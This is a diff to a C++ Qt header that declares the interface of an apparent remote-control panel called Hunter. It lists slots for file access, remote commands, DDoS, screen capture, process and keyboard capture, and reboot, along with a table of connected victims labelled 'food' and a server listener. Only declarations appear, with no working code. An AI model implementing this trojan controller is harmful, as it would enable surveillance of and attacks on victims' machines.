@@ -2,6 +2,12 @@
 #define HUNTER_H
 
 #include <QWidget>
+#include <QDebug>
+#include <QIcon>
+#include <QPushButton>
+#include <QSizePolicy>
+#include <QMenu>
+#include <QAction>
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class Hunter; }
@@ -17,5 +23,34 @@ public:
 
 private:
     Ui::Hunter *ui;
+    QMenu *m_Rclick; // 右键菜单
+
+public slots:
+    // 几个功能点击逻辑
+    void btFileClicked();
+    void btCmdClicked();
+    void btDDOSClicked();
+    void btScreenClicked();
+    void btProcessClicked();
+    void btKeybdClicked();
+
+    // 右键菜单点击
+    void sendBoxClicked();
+    void OfflineClicked();
+    void rebootClicked();
+
+    // 添加食物列表
+    void addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo);
+    // 删除食物
+    void rmFoodFromTbl(int id);
+    // 返回当前选中食物ID
+    int curFoodIdInTbl();
+
+    // 开启服务器监听
+    void startLstn();
+
+protected:
+    // 重写事件过滤函数
+    bool eventFilter(QObject *watched, QEvent *event);
 };
 #endif // HUNTER_H
